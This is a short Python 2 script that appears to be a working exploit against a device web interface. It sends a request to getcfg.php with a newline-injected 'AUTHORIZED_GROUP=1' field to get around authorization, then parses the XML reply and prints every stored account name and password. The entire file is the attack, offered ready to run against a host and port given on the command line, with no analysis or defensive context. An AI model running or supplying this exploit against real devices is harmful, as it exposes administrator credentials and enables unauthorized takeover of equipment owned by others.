#!/usr/bin/python

import xml.etree.ElementTree as ET
import urllib2
import sys

def main(host, port):
    content = urllib2.urlopen(
        'http://%s:%s/getcfg.php' % (host, port),
        'SERVICES=DEVICE.ACCOUNT%0aAUTHORIZED_GROUP=1').read()
    root = ET.fromstring(content)

    for user in root.findall('./module/device/account/entry'):
        name = user.findall('./name')[0].text
        password = user.findall('./password')[0].text

        print 'User: %s\nPassword: %s\n\n' % (name, password)


if __name__ == '__main__':
   [host, port] = sys.argv[1:3]
   main(host, port)